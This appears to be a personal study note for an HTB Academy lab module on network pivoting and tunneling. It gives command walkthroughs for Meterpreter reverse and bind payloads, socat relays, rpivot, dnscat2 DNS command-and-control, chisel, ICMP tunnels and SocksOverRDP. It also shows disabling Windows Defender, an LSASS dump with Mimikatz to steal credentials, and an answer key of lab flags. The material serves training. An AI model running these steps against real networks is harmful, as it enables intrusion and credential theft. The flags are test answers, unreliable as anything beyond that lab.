# Pivoting, Tunneling, and Port Forwarding (HTB Supplementary)

HTB Academy module: "Pivoting, Tunneling, and Port Forwarding" (Tier 2, Medium, mrb3n / TreyCraf7_1 / LTNB0B). Supplementary content for [[Port Redirection and SSH Tunneling]] (Module 19).

**Already in the vault — NOT duplicated here:**
- Networking basics (routing tables, eth0/tun0 assignment) — 19.1
- SSH dynamic port forwarding (`ssh -D 9050`) + proxychains + xfreerdp — [[Port Redirection and SSH Tunneling#19.3.2 SSH Dynamic Port Forwarding|19.3.2]]
- SSH remote/reverse port forwarding (`ssh -R`) — [[Port Redirection and SSH Tunneling#19.3.3 SSH Remote Port Forwarding|19.3.3]]
- Netsh portproxy — [[Port Redirection and SSH Tunneling#19.4.3 Netsh (Network Shell)|19.4.3]]
- Socat port forward basics — [[Port Redirection and SSH Tunneling#19.2.3 Port Forwarding with Socat|19.2.3]]

---

## PT.1 Meterpreter Tunneling & Port Forwarding

When you land a Meterpreter session on a Linux pivot host you can build a full SOCKS proxy without touching SSH at all — Metasploit handles routing and the proxy server internally.

**Full workflow:**

```bash
# 1. Generate a Linux Meterpreter payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=8080 -f elf -o pivot.elf

# 2. Start the handler
msfconsole -q
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8080
run

# 3. Transfer + execute on the pivot host
scp pivot.elf ubuntu@<target>:~/
# (SSH into target) chmod +x pivot.elf && ./pivot.elf
```

**Once Meterpreter session is open — add routes and set up SOCKS:**

```
# Background the session
bg

# Start a SOCKS proxy server (listens on 127.0.0.1:9050 on Kali)
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set VERSION 4a
run     # runs as background job

# Attach back to session and add route to the internal network
sessions -i 1
run autoroute -s 172.16.5.0/23
# [+] Added route to 172.16.5.0/255.255.254.0 via <session-ip>
```

**Proxychains through the MSF SOCKS proxy:**
Make sure `/etc/proxychains.conf` has:
```
socks4 127.0.0.1 9050
```
Then:
```bash
proxychains nmap 172.16.5.35 -Pn -sT -n    # -sT and -Pn mandatory through proxychains
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

**Ping sweep from within a Meterpreter shell session:**
```bash
# Drop into a shell from meterpreter, then bash -i, then:
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
# Shows live hosts by IP
```

> 🔍 Worth remembering: `run autoroute -s` takes CIDR or netmask notation. The /23 for 172.16.5.0/23 covers both 172.16.4.x and 172.16.5.x. Use `run autoroute -p` to list what's currently routed.

> 🔁 Similar to: [[Port Redirection and SSH Tunneling#19.3.2 SSH Dynamic Port Forwarding|19.3.2]] (SSH -D 9050) for the SOCKS part; [[Port Redirection and SSH Tunneling#19.3.5 Using sshuttle|19.3.5]] for the transparent routing part — this is the MSF equivalent.

---

## PT.2 Socat with a Meterpreter Bind Shell

When the internal Windows target can't call back to Kali (egress filtered), use a **bind_tcp** payload — the target listens, you connect in. Socat on the pivot host forwards your connection.

```bash
# 1. Generate a Windows bind Meterpreter payload
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8443 -f exe -o bindshell.exe

# 2. Get the payload onto the Windows internal host (via the pivot, via proxychains, etc.)

# 3. On the pivot host — socat forwards your connection inward
socat TCP-LISTEN:8080,fork TCP:172.16.5.19:8443
```

**Catch the bind shell from Kali:**
```
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set LHOST 0.0.0.0          # not used for bind
set LPORT 8080              # the port socat is listening on (pivot host's exposed port)
set RHOST <pivot-host-ip>   # required for bind_tcp — connect TO this host
run
```

Key difference from reverse shells: `RHOST` is set (you're connecting out to the target's listener), not `LHOST`. The SSH tunneling is not required — socat alone handles the relay.

> 🔁 Similar to: [[Port Redirection and SSH Tunneling#19.2.3 Port Forwarding with Socat|19.2.3]] (same socat command). The new piece here is the MSF bind_tcp payload type and the `RHOST` handler pattern.

---

## PT.3 Rpivot — Web Server Pivoting via HTTP

**Rpivot** creates a SOCKS proxy that tunnels traffic over HTTP (not TCP or SSH). Useful when only HTTP/HTTPS egress is permitted.

**Architecture:** attack host runs `server.py` (acts as a SOCKS server that receives from the proxy client), pivot host runs `client.py` (connects outbound to attacker's server, relays traffic).

```bash
# On Kali — clone and start the server
git clone https://github.com/klsecservices/rpivot.git
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
# SOCKS listener is on :9050; client connection listener is on :9999
```

```bash
# Transfer rpivot to pivot host, then run the client:
python2.7 client.py --server-ip <kali-ip> --server-port 9999
# Output: "Backconnecting to server <kali-ip> port 9999"
```

Once the client connects back, use proxychains on Kali normally:
```bash
proxychains firefox http://172.16.5.135/   # or any internal resource
```

**Corporate proxy variant** (when the pivot host has to go through an upstream proxy):
```bash
python2.7 client.py --server-ip <kali-ip> --server-port 9999 \
  --ntlm-proxy-ip <proxy-ip> --ntlm-proxy-port <proxy-port> \
  --domain <domain> --username <user> --password <pass>
```

> 🔍 Worth remembering: Rpivot uses Python 2.7. If the pivot host only has Python 3, you'll need to port the client or find another method. Also requires the proxychains SOCKS4 entry to be `socks4 127.0.0.1 9050` (Rpivot speaks SOCKS4/4a, not SOCKS5).

> 📸 Screenshot: rpivot client connecting to server, proxychains browser loading internal web page with flag

---

## PT.4 DNS Tunneling with Dnscat2

**Dnscat2** hides C2 traffic inside DNS queries. Every command/response is encoded into DNS request/response packets. Useful when a firewall only allows DNS outbound traffic (port 53 UDP).

**Architecture:** attack host runs the Ruby server (`dnscat2.rb`) as a fake DNS authority for a domain. The compromised Windows host runs a PowerShell client that makes DNS queries for subdomains of that domain — the content of those subdomains IS the C2 channel.

```bash
# On Kali — install dependencies and start the server
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
bundle install
sudo ruby dnscat2.rb --dns host=<kali-ip>,port=53,domain=inlanefreight.local --no-cache
# Note the pre-shared secret printed on startup
```

**On the Windows target — PowerShell client:**
```powershell
# Transfer dnscat2.ps1 from GitHub to the target first
git clone https://github.com/lukebaggett/dnscat2-powershell.git
# (serve via python3 -m http.server, download via New-Object Net.WebClient)

Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSServer <kali-ip> -Domain inlanefreight.local \
  -PreSharedSecret <secret-from-server-startup> -Exec cmd
```

**Back on Kali — interact with the new session:**
```
dnscat2> window -i 1
# Drops into an interactive cmd.exe shell through the DNS tunnel

exec (OFFICEMANAGER) 1> type C:\Users\htb-student\Documents\flag.txt
```

> 🔍 Worth remembering: DNS tunneling is slow (DNS has small payload sizes, high latency). It's a last-resort channel when everything else is blocked, not a comfortable working shell. Interactive sessions will feel sluggish.
> The pre-shared secret (`--secret` flag or printed by the server) must match on both sides, otherwise the session is rejected with a crypto error.

> 📸 Screenshot: dnscat2 server showing new session, window -i 1, type flag.txt output

---

## PT.5 SOCKS5 Tunneling with Chisel (Server-on-Pivot-Host Variant)

The [[Chisel]] Modern Tooling entry documents the reverse variant (attacker as server, target as client). This section covers the **forward variant** where the pivot host runs as the server:

```bash
# On Kali — download the binary (use a specific older version for stability)
wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz
gunzip chisel_1.7.6_linux_amd64.gz
chmod +x chisel_1.7.6_linux_amd64

# Transfer to pivot host
scp chisel_1.7.6_linux_amd64 ubuntu@<pivot-host>:~/
```

```bash
# On the PIVOT HOST — run as server
./chisel_1.7.6_linux_amd64 server -v -p 9001 --socks5
# Output: "Listening on http://0.0.0.0:9001"
```

```bash
# On Kali — connect as client, creates SOCKS5 proxy on 127.0.0.1:1080
./chisel_1.7.6_linux_amd64 client -v <pivot-host-ip>:9001 socks
# Output: "tun: proxy#127.0.0.1:1080=>socks: Listening"
```

**Update proxychains for SOCKS5:**
```
# /etc/proxychains.conf:
#socks4    127.0.0.1 9050    <- comment out
socks5 127.0.0.1 1080         <- add this
```

Then use normally:
```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

**Topology comparison:**

| Variant | Server location | Client location | When to use |
|---------|----------------|-----------------|-------------|
| Reverse (Modern Tooling) | Kali | Pivot host | Pivot can reach Kali, Kali can't reach pivot (NAT/firewall) |
| Forward (this section) | Pivot host | Kali | Both can reach each other; simpler setup |

> 🔁 [[Chisel]] (Modern Tooling) for the reverse variant and general description

---

## PT.6 ICMP Tunneling with ptunnel-ng

**ptunnel-ng** encapsulates TCP traffic inside ICMP echo request/reply packets (pings). Useful when only ICMP is permitted outbound (rare but exists in some locked-down environments).

**Build ptunnel-ng as a static binary** (so it can be transferred and run without dependencies):
```bash
git clone https://github.com/utoni/ptunnel-ng.git
sudo apt install automake autoconf -y
cd ptunnel-ng/
# Patch autogen.sh to add --enable-static:
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh
```

**Transfer + run on the pivot host (server mode):**
```bash
scp -r ptunnel-ng ubuntu@<pivot-host>:~/
# (SSH to pivot host)
sudo ./ptunnel-ng/src/ptunnel-ng -r<pivot-host-ip> -R22
# -r = real (target) IP to forward to; -R = real port
```

**On Kali (client mode) — creates a local TCP tunnel through ICMP:**
```bash
sudo ./ptunnel-ng/src/ptunnel-ng -p<pivot-host-ip> -l2222 -r<pivot-host-ip> -R22
# -p = proxy host (the pivot host running the server)
# -l = local TCP port to listen on (2222 in this example)
# -r = remote (destination) host; -R = remote port (22 = SSH)
```

**SSH through the tunnel:**
```bash
# Test connectivity:
ssh -p2222 -lubuntu 127.0.0.1

# With dynamic port forwarding for full proxychains support:
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

Then use proxychains as normal (SOCKS4, port 9050).

> 🔍 Worth remembering: ptunnel-ng requires root on both sides (raw ICMP socket access). The tunnel is ICMP-encapsulated TCP — the SSH session inside is still encrypted, but the outer ICMP packets are plaintext at the ICMP layer (though the content is the encrypted SSH stream). IDS with ICMP deep inspection may catch unusual ICMP payload sizes.

> 📸 Screenshot: ptunnel-ng server running on pivot, client creating tunnel, ssh -p2222 session established

---

## PT.7 SocksOverRDP + Proxifier (Windows-Only Multi-Hop via RDP)

**The problem:** you have RDP access to a Windows pivot host, but no outbound SSH or raw TCP from Kali to the inner network. You need to pivot from inside the RDP session.

**SocksOverRDP** loads as an RDP virtual channel extension. When you connect via mstsc.exe (Remote Desktop) with the plugin loaded, it negotiates a SOCKS proxy channel through the RDP session itself. Then **Proxifier** on the pivot host routes new mstsc.exe connections through that SOCKS proxy.

```bash
# On Kali — download both tools
wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
wget https://www.proxifier.com/download/ProxifierPE.zip
unzip SocksOverRDP-x64.zip   # gets SocksOverRDP-Plugin.dll and SocksOverRDP-Server.exe
unzip ProxifierPE.zip         # gets Proxifier.exe
```

**On the Windows pivot host (first RDP hop):**
```powershell
# 1. Disable Windows Defender (or it will delete SocksOverRDP DLL)
# Settings → Windows Security → Virus & threat protection → turn off

# 2. Copy in SocksOverRDP-Plugin.dll, SocksOverRDP-Server.exe, Proxifier PE/
# (copy-paste via RDP clipboard, or xfreerdp /drive:kali,/home/kali/transfers)

# 3. Register the plugin (creates 127.0.0.1:1080 SOCKS listener on the pivot host when mstsc.exe connects)
regsvr32.exe SocksOverRDP-Plugin.dll
```

```cmd
:: 4. Open mstsc.exe — it now connects through the plugin
mstsc.exe
:: Connect to the INNER Windows host (e.g. 172.16.5.19) with that user's creds
:: The plugin creates a SOCKS listener at 127.0.0.1:1080 on the PIVOT HOST
```

**On the inner Windows host (second RDP hop):**
```powershell
# Uninstall Windows Defender before transferring SocksOverRDP-Server.exe:
Uninstall-WindowsFeature -Name Windows-Defender

# Copy SocksOverRDP-Server.exe over (via RDP clipboard from pivot), run as admin
.\SocksOverRDP-Server.exe
```

**Back on the pivot host — run Proxifier:**
- Open `Proxifier.exe` as administrator
- Profile → Proxy Servers → Add: `127.0.0.1:1080`, SOCKS5
- Now any tool on the pivot host that Proxifier intercepts routes through the SOCKS channel

**Final hop — open mstsc.exe from the pivot host and connect to the final target:**
- Proxifier intercepts mstsc.exe's traffic and routes it through the SOCKS channel via the inner host

> 🔍 Worth remembering: this chain runs entirely inside Windows RDP sessions — no new inbound ports, no Kali TCP reach into the inner network. AV must be disabled on both Windows hosts or the DLL/EXE get deleted on transfer.

> 📸 Screenshot: regsvr32 success dialog, mstsc.exe with SocksOverRDP negotiation in log, Proxifier showing active rule, final RDP session on target

---

## PT.8 Skills Assessment Chain

**Environment:** 3-hop network traversal — webshell on exposed web server → Ubuntu pivot (172.16.5.15/16) → Windows server (172.16.5.35) → Windows workstation (172.16.6.25) → DC network share.

### Step 1: Webshell → SSH access as webadmin

The web server has a p0wny webshell accessible at the root URL. From it:
```
cd /home/webadmin
cat for-admin-eyes-only
# Reveals: mlefay / Plain Human work!

cat id_rsa
# SSH private key for webadmin
```

On Kali — save the key, fix permissions, connect:
```bash
chmod 600 id_rsa
ssh -i id_rsa webadmin@<target-ip>
```

### Step 2: Meterpreter pivot to 172.16.5.35

```bash
# Check internal network
ip a       # shows 172.16.5.15/16 on ens192

# Ping sweep to find other hosts
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
# Finds: 172.16.5.15 (us) and 172.16.5.35

# Generate payload, transfer, catch (as in PT.1)
# autoroute -s 172.16.5.0/16
# socks_proxy (SOCKS4a :9050)
# proxychains nmap 172.16.5.35 -Pn -sT → port 3389 open
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'
```

Flag at `C:\Flag.txt` → `S1ngl3-Piv07-3@sy-Day`

### Step 3: Mimikatz → vfrank credentials

On 172.16.5.35 (via RDP as mlefay):
1. Transfer `mimikatz.exe` (x64 version) via RDP clipboard or xfreerdp drive mount
2. Create LSASS minidump via Task Manager → Details → lsass.exe → Create dump file
3. Load into Mimikatz:
```
sekurlsa::minidump C:\Users\mlefay\AppData\Local\Temp\lsass.DMP
sekurlsa::LogonPasswords
```
Output shows **vfrank** with Kerberos password **`Imply wet Unmasked!`**

> 🔧 Technique: the domain account `vfrank` is authenticated interactively on this machine (Service logon), so its credentials are cached in LSASS memory. Accounts logged in this way are the "bad habit" of running services under domain user accounts.

### Step 4: Enumerate 172.16.6.x and RDP to workstation

From PowerShell on 172.16.5.35:
```powershell
1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
# Finds: 172.16.6.25 alive
```

RDP to 172.16.6.25 as `vfrank:Imply wet Unmasked!`.

Flag at `C:\Flag.txt` → `N3tw0rk-H0pp1ng-f0R-FuN`

### Step 5: DC flag via mapped network share

On the 172.16.6.25 workstation: open This PC → `AutomateDCAdmin (Z:)` network share is already mounted → navigate to the share → `Flag.txt` → `3nd-0xf-Th3-R@inbow!`

> 🔍 Worth remembering: domain workstations that have mapped drives to the DC (via startup scripts, GPO, or manual admin mapping) give you free access to DC resources without needing to compromise the DC itself — as long as your user has permission on the share.

---

## PT.9 Q&A Answers

**The Networking Behind Pivoting**
1. NIC with public IP in the ifconfig example: **eth0**
2. NIC that would forward packets to 10.129.10.25: **tun0**
3. Gateway for packets to www.hackthebox.com (default route): **178.62.64.1**

**Dynamic Port Forwarding with SSH and SOCKS Tunneling**
1. Number of network interfaces on the web server (including loopback): **3**
2. Flag on DC at 172.16.5.19 via proxychains xfreerdp: **N1c3Piv0t**

**Remote/Reverse Port Forwarding with SSH**
1. Ubuntu pivot host IP that allows communication with the Windows server: **172.16.5.129**
2. IP used to ensure handler listens on all interfaces: **0.0.0.0**

**Meterpreter Tunneling & Port Forwarding**
1. Two IPs discoverable from ping sweep: **172.16.5.19,172.16.5.129**
2. AutoRoute entry that allows 172.16.5.19 to be reachable: **172.16.5.0/255.255.254.0**

**Socat Redirection with a Reverse Shell**
1. SSH Tunneling required with Socat? **False**

**Socat Redirection with a Bind Shell**
1. Meterpreter payload used for bind shell: **windows/x64/meterpreter/bind_tcp**

**Web Server Pivoting with Rpivot**
1. Which host runs rpivot's server.py: **Attack Host**
2. Which host runs rpivot's client.py: **Pivot Host**
3. Flag on internal web server via proxychains Firefox: **I_L0v3_Pr0xy_Ch@ins**

**Port Forwarding with Windows: Netsh**
1. Approved contact in VendorContacts.txt: **Jim Flipflop**

**DNS Tunneling with Dnscat2**
1. Flag in C:\\Users\\htb-student\\Documents\\flag.txt: **AC@tinth3Tunnel**

**SOCKS5 Tunneling with Chisel**
1. Flag in C:\\Users\\victor\\Documents\\flag.txt: **Th3$eTunne1$@rent8oring!**

**ICMP Tunneling with SOCKS**
1. Flag in C:\\Users\\victor\\Downloads\\flag.txt: **N3Tw0rkTunnelV1sion!**

**RDP and SOCKS Tunneling with SocksOverRDP**
1. Flag on Jason's Desktop: **H0pping@roundwithRDP!**

**Skills Assessment**
1. User directory with credentials: **webadmin**
2. Credentials found in home directory: **mlefay:Plain Human work!**
3. Second active host on internal network: **172.16.5.35**
4. C:\\Flag.txt on first Windows pivot: **S1ngl3-Piv07-3@sy-Day**
5. Vulnerable user (credentials exposed in LSASS): **vfrank**
6. C:\\Flag.txt on second Windows hop: **N3tw0rk-H0pp1ng-f0R-FuN**
7. C:\\Flag.txt on the DC (via network share Z:): **3nd-0xf-Th3-R@inbow!**

---

🔁 [[Port Redirection and SSH Tunneling]] (Module 19 — the Offsec version covering Socat/SSH/sshuttle/Plink/Netsh)
🔁 [[Chisel]] (Modern Tooling — reverse variant and general reference)
🔁 [[Ligolo-ng]] (Modern Tooling — TUN-based pivoting, no proxychains needed)

#### Tags: #Pivoting #Tunneling #Meterpreter #autoroute #socks_proxy #Rpivot #Dnscat2 #Chisel #ICMP #ptunnel-ng #SocksOverRDP #Proxifier #SkillsAssessment #HTBSupplementary
